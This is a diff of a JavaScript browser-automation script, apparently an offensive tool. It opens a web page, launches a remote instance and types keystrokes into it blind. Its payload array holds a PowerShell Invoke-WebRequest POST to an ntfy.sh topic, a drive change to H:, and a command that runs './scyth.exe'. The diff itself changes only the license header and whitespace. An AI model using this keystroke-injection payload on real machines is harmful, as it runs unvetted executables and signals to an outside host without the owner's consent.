@@ -1,3 +1,8 @@
+/*
+ * This code is licensed under the MIT license
+ * (C) Aarys Sahler, 2024
+ */
+
 import arg from "arg";
 
 const args = arg({
@@ -64,7 +69,7 @@ async function type(keyboard, str, to) {
 		await keyboard.press(".");
 		await _wait(150);
 		break;
-	
+
 	    default:
 		await keyboard.press(k);
 	}
@@ -77,7 +82,7 @@ async function type(keyboard, str, to) {
 	await _wait(to);
     }
 
-    await keyboard.press("Enter") 
+    await keyboard.press("Enter")
 }
 
 const payload = ['Invoke-WebRequest -URI ntfy.sh/aarys-main-test -method post -Body "feur"', "H:", "./scyth.exe"]
@@ -86,7 +91,7 @@ async function main() {
     log("[*] starting blind")
 
     log("[*] Opening " + process.env.URL);
-    
+
     if(args["--no-headless"]){
 	log("[*] Opening chrome")
     } else {
@@ -111,8 +116,8 @@ async function main() {
     await page.waitForSelector(instanceSelector);
 
     log("[*] Launching instance ...")
-   
-    
+
+
     await page.evaluate((sel) => {
         let i = Array.from(document.querySelector(sel).children).filter(child => child.id.includes("3d"))[0];
 
@@ -191,6 +196,6 @@ async function main() {
     }
 }
 
-(async () => 
+(async () =>
     await main()
 )()
